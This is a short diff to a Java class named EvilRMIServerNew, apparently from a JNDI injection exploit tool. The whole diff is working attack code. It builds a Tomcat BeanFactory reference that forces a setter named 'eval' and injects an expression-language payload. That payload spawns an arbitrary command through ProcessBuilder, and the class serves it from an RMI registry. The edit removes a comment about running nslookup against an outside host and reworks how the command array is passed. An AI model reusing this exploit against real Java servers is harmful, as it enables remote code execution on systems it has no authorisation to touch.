@@ -33,8 +33,8 @@ public class EvilRMIServerNew implements Runnable {
             ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
             //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
             ref.add(new StringRefAddr("forceString", "x=eval"));
-            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
-            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c', " + cmd + "]).start()\")"));
+            //expression language to execute our command
+            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']([" + cmd + "]).start()\")"));
 
             ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
             registry.bind("Object", referenceWrapper);
